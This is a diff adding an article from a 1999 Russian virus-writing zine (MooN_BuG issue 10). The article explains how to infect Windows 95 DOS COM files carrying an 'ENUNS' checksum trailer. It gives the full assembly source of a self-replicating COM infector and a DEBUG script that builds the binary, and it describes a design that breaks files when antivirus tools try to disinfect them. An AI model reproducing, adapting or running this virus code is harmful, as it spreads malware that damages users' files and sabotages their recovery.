@@ -1,0 +1,181 @@
+[TulaAnti&ViralClub] PRESENTS ...
+MooN_BuG, Issue 10, Apr 1999                                          file 010
+
+                           ENUNS-FILES INFECTION                 [C] Mongoose
+──────────────────────────────────────────────────────────────────────────────
+
+    Дос вымирает. Билли  уже во всю потеет над виндами 2000, которые уже бу-
+ дут работать без DOS'а! Ну а 95тые окна принесли новые заморочки начинающим
+ вирмейкерам.
+
+    Как известно в 95ом есть "собственный дос". Если посмотреть на COM файлы
+ в %windir%\command то мы увидим в конце файла байты ENUNS,  а за ними конт-
+ рольную сумму  файла (?). Обычным способом эти (COM) файлы заражаются нехо-
+ тят (они  предпочитают  повиснуть). В заголовках EXE-файлов  тоже  мелькает
+ что-то похожее на ENUNS,  но эти файлы успешно заражаются стандартными спо-
+ собами.
+
+    А вообще и ENUNS-файлы заражать довольно легко, не надо вообще  подсчиты-
+ вать crc.
+
+    Для начала надо считать последние 7 байт в буффер,  они должны представ-
+ лять из себя что-то типа: ENUNS??, где последние два байта crc  файла. Если
+ мы хотим чтоб файл после заражения работал эти байты должны остаться в кон-
+ це файла, т.е. буффер должен  находиться в конце тела вируса (можно конечно
+ поизвращаться с переносами и т.д.), теперь надо добавить к контрольной сум-
+ ме размер тела вируса, которое мы приписываем к файлу и все готово.
+
+    Ниже представлен Ninnyish.Generic с одной фишкой. Этот вирус пишется  не
+ за файлом, а затирает семь последних байт (все равно они нам не нужны). Вся
+ фишка в том, что зараженные файлы прекрасно работают пока в них есть вирус,
+ а  когда паутиныч береться лечить зараженные файлы, он стирает вместе с ви-
+ русом нужные файлу байты и файл виснет.
+
+;────[ENUNS.ASM]─────[CUT HERE]────────────────────────────────────────────────
+               .model tiny
+               .code
+                org   100h
+ del_block            equ 7                     ; Bytes to erase
+
+ start:         jmp    real_start
+                nop
+ real_start:    call   calculate_ip             ; Calculate IP
+ calculate_ip:  pop    bp
+                sub    bp,offset calculate_ip
+
+ restore_orig:  mov    di,100h                  ; Restore original bytes
+                lea    si,[bp+original_bytes]
+                movsw
+                movsw
+
+ set_new_dta:   mov    ah,1ah                   ; Set new DTA
+                lea    dx,[bp+dta]
+                int    21h
+
+ find_first:    mov    ah,4eh                   ; Find first COM-file
+                sub    cx,cx
+                lea    dx,[bp+file_mask]
+ find_next:     int    21h
+                jc     restore_dta
+
+ open_file:     mov    ax,3d02h                 ; Open for read'n'write
+                lea    dx,[bp+dta+1eh]
+                int    21h
+                xchg   bx,ax                    ; Move file handle
+
+                mov    ah,3fh                   ; Read first 4 bytes
+                mov    cx,4
+                lea    dx,[bp+original_bytes]
+                int    21h
+
+                mov    cx,word ptr [bp+dta+1ah]
+                cmp    cx,1000
+                jb     close_file
+                cmp    cx,64000
+                ja     close_file
+
+                cmp    byte ptr [bp+original_bytes+3],5
+                jz     close_file
+
+                mov    ax,4202h                 ; Move file pointer
+                mov    cx,0ffffh
+                mov    dx,0fff9h
+                int    21h
+
+                mov    ah,3fh                   ; Read 7 bytes
+                mov    cx,7
+                lea    dx,[bp+enuns]
+                int    21h
+
+                cmp    word ptr [bp+enuns],'NE'
+                jnz    close_file
+;┌────────────────────────────────────────────────────────────────────────────
+;│ Add to virus size to CRC
+;└────────────────────────────────────────────────────────────────────────────
+                add    word ptr [bp+enuns+5],(end_of_code-real_start)-del_block
+
+                call   infect                   ; Infect file
+
+ close_file:    mov    ah,3eh                   ; Close file
+                int    21h
+
+                mov    ah,4fh                   ; Find next file
+                jmp    find_next
+
+ restore_dta:   mov    ah,1ah                   ; Restore DTA
+                mov    dx,80h
+                int    21h
+
+                mov    ax,100h                  ; Return control
+                jmp    ax
+
+ info                  db 'friday the 13th'
+;┌────────────────────────────────────────────────────────────────────────────
+;│ Infect file
+;└────────────────────────────────────────────────────────────────────────────
+ infect:        mov    ax,4202h                 ; Move file pointer
+                mov    cx,0ffffh
+                mov    dx,0fff9h
+                int    21h
+
+                mov    ah,40h                   ; Write virus body
+                mov    cx,(end_of_code-real_start)
+                lea    dx,[bp+real_start]
+                int    21h
+
+                mov    ax,4200h                 ; Move pointer to end of file
+                sub    cx,cx
+                cwd
+                int    21h
+
+                mov    byte ptr [bp+buffer],0e9h; Create JMP
+                mov    cx,word ptr [bp+dta+1ah]
+                sub    cx,3+del_block
+                mov    word ptr [bp+buffer+1],cx
+                mov    byte ptr [bp+buffer+3],5
+
+                mov    ah,40h                   ; Write JMP
+                mov    cx,4
+                lea    dx,[bp+buffer]
+                int    21h
+                ret
+;┌────────────────────────────────────────────────────────────────────────────
+;│ DATA
+;└────────────────────────────────────────────────────────────────────────────
+ file_mask             db '*.com',0             ; File Mask
+ original_bytes        db 0cdh,20h,?,?          ; Original bytes
+ enuns                 db 7 dup (?)             ; ENUNS??
+ end_of_code    label  byte
+;┌────────────────────────────────────────────────────────────────────────────
+;│ HEAP
+;└────────────────────────────────────────────────────────────────────────────
+ buffer                db  4 dup (?)
+ dta                   db 43 dup (?)
+                end    start
+;────[ENUNS.ASM]─────[EOF]─────────────────────────────────────────────────────
+
+;────[ENUNS.SCR]─────[CUT HERE]────────────────────────────────────────────────
+N ENUNS.COM
+E 0100 EB 02 90 90 E8 00 00 5D 81 ED 07 01 BF 00 01 8D
+E 0110 B6 E4 01 A5 A5 B4 1A 8D 96 F3 01 CD 21 B4 4E 2B
+E 0120 C9 8D 96 DE 01 CD 21 72 5B B8 02 3D 8D 96 11 02
+E 0130 CD 21 93 B4 3F B9 04 00 8D 96 E4 01 CD 21 8B 8E
+E 0140 0D 02 81 F9 E8 03 72 34 81 F9 00 FA 77 2E 80 BE
+E 0150 E7 01 05 74 27 B8 02 42 B9 FF FF BA F9 FF CD 21
+E 0160 B4 3F B9 07 00 8D 96 E8 01 CD 21 81 BE E8 01 45
+E 0170 4E 75 09 81 86 ED 01 E4 00 E8 23 00 B4 3E CD 21
+E 0180 B4 4F EB A1 B4 1A BA 80 00 CD 21 B8 00 01 FF E0
+E 0190 66 72 69 64 61 79 20 74 68 65 20 31 33 74 68 B8
+E 01A0 02 42 B9 FF FF BA F9 FF CD 21 B4 40 B9 EB 00 8D
+E 01B0 96 04 01 CD 21 B8 00 42 2B C9 99 CD 21 C6 86 EF
+E 01C0 01 E9 8B 8E 0D 02 83 E9 0A 89 8E F0 01 C6 86 F2
+E 01D0 01 05 B4 40 B9 04 00 8D 96 EF 01 CD 21 C3 2A 2E
+E 01E0 63 6F 6D 00 CD 20
+RCX
+00E6
+W
+Q
+;────[ENUNS.SCR]─────[EOF]─────────────────────────────────────────────────────
+
+                                                                (c) Mongoose
+
